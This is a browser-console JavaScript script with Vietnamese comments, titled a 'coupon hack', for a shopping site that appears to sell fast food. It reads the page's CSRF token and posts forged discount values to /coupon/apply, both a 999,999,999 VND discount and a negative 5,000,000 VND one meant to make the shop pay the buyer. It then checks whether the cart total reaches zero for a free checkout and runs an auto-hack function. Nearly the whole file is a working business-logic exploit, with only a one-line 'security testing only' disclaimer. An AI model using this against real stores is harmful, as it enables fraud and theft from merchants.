/**
 * 🚨 BROWSER CONSOLE COUPON HACK - SIMPLE VERSION
 * Copy từng lệnh dưới đây vào browser console (F12)
 * Thực hiện từ trang có sản phẩm trong cart
 */

console.log("🚨 COUPON HACK COMMANDS LOADED");

// =====================================================
// 🎯 LỆNH 1: LẤY CSRF TOKEN (Chạy đầu tiên)
// =====================================================
const csrf = document.querySelector('meta[name="csrf-token"]').content;
console.log("✅ CSRF Token:", csrf);

// =====================================================
// 🎯 LỆNH 2: HACK COUPON BASIC (999 triệu VNĐ)
// =====================================================
fetch('/coupon/apply', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'X-CSRF-TOKEN': csrf
    },
    body: JSON.stringify({
        coupon_code: 'FASTFOOD10',
        discount: 999999999
    })
}).then(r => r.json()).then(data => {
    console.log("🚨 HACK RESULT:", data);
    if(data.success) {
        console.log("💰 Discount applied:", data.discount.toLocaleString('vi-VN'), "đ");
        alert("🚨 HACK THÀNH CÔNG! Discount: " + data.discount.toLocaleString('vi-VN') + "đ");
    }
});

// =====================================================
// 🎯 LỆNH 3: HACK COUPON NEGATIVE (User được trả tiền)
// =====================================================
fetch('/coupon/apply', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'X-CSRF-TOKEN': csrf
    },
    body: JSON.stringify({
        coupon_code: 'FASTFOOD10',
        discount: -5000000  // User được 5 triệu
    })
}).then(r => r.json()).then(data => {
    console.log("🚨 NEGATIVE HACK:", data);
    if(data.success && data.discount < 0) {
        console.log("💰 User sẽ được trả:", Math.abs(data.discount).toLocaleString('vi-VN'), "đ");
        alert("🚨 NEGATIVE HACK THÀNH CÔNG! Bạn được trả: " + Math.abs(data.discount).toLocaleString('vi-VN') + "đ");
    }
});

// =====================================================
// 🎯 LỆNH 4: CHECK CART STATUS
// =====================================================
fetch('/cart').then(r => r.text()).then(html => {
    const match = html.match(/Tổng cộng[^0-9]*(\d{1,3}(?:\.\d{3})*|\d+)/i);
    if(match) {
        const total = parseInt(match[1].replace(/\./g, ''));
        console.log("💵 Cart total:", total.toLocaleString('vi-VN'), "đ");
        if(total <= 0) {
            console.log("🚨 CART TOTAL ≤ 0! Ready for free order!");
            alert("🚨 CART TOTAL: " + total.toLocaleString('vi-VN') + "đ - Có thể đặt hàng miễn phí!");
        }
    }
});

// =====================================================
// 🎯 LỆNH 5: AUTO HACK (Chạy tất cả)
// =====================================================
async function autoHack() {
    console.log("🚀 Starting auto hack...");
    
    // Get CSRF
    const token = document.querySelector('meta[name="csrf-token"]').content;
    
    // Try massive discount
    const response = await fetch('/coupon/apply', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'X-CSRF-TOKEN': token
        },
        body: JSON.stringify({
            coupon_code: 'FASTFOOD10',
            discount: 999999999
        })
    });
    
    const result = await response.json();
    
    if(result.success) {
        console.log("🚨 AUTO HACK SUCCESS!");
        console.log("💰 Discount:", result.discount.toLocaleString('vi-VN'), "đ");
        
        // Check cart
        const cartResponse = await fetch('/cart');
        const cartHtml = await cartResponse.text();
        const totalMatch = cartHtml.match(/Tổng cộng[^0-9]*(\d{1,3}(?:\.\d{3})*|\d+)/i);
        
        if(totalMatch) {
            const total = parseInt(totalMatch[1].replace(/\./g, ''));
            console.log("💵 New cart total:", total.toLocaleString('vi-VN'), "đ");
            
            if(total <= 0) {
                alert(`🚨 HACK HOÀN THÀNH!\n💰 Discount: ${result.discount.toLocaleString('vi-VN')}đ\n💵 Cart total: ${total.toLocaleString('vi-VN')}đ\n🎯 Có thể checkout miễn phí!`);
            }
        }
    } else {
        console.log("❌ Hack failed:", result);
        alert("❌ Hack thất bại - Server có thể đã được bảo vệ");
    }
}

// Run auto hack
autoHack();

console.log(`
🎯 AVAILABLE COMMANDS:
=====================
- autoHack()                    // Chạy hack tự động
- csrf                          // Xem CSRF token
- Copy các lệnh fetch() ở trên  // Hack thủ công

🚨 WARNING: CHỈ SỬ DỤNG ĐỂ TEST BẢO MẬT!
`); 